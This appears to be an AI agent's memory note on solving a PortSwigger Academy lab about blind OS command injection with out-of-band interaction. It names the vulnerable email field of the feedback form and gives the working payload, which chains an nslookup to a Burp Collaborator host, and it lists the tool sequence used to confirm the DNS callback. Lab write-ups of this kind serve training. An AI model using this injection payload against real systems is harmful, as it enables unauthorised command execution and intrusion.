---
metadata:
  node_type: memory
name: "Web Lab Arm A - Blind OS Command Injection OOB"
description: "lab-blind-out-of-band (Arm A): feedback email 字段 `x@x.com||nslookup <label>.oastify.com||` 触发 DNS 回调即翻牌"
last_updated: 2026-10-10T19:47:57+08:00
created: 2026-10-10T19:47:57+08:00
---

## blind OS command injection / out-of-band interaction(web-security/os-command-injection/lab-blind-out-of-band)

- 实例: range_launch launch-url <canonical 路径> --jar /tmp/cj1.json(reused:false,直接起)。
- 面: `/feedback` 表单 → POST `/feedback/submit`(csrf/name/email/subject/message,响应 `{}` JSON,命令异步执行,响应无回显)。
- 注入点: `email` 字段。载荷 `x@x.com||nslookup <label>.oastify.com||` 一次命中。
- 收号面: burp_collab `new --state /tmp/bc1.json` 派生 `<label>.oastify.com`;`poll --state` 回读 2 条 DNS 交互(client 34.245.x, protocol dns);Academy OOB 判定吃公共 collaborator(oastify.com)交互,不需要 lab 专属 secret。
- 翻牌: 交互到达即 banner `is-solved` + "Congratulations, you solved the lab!"(banner_verdict 单次确认,无需二次探针)。
- 部件链: page_read → range_launch → http_session(get 取 csrf / post 投载荷) → burp_collab(new/poll) → banner_verdict。
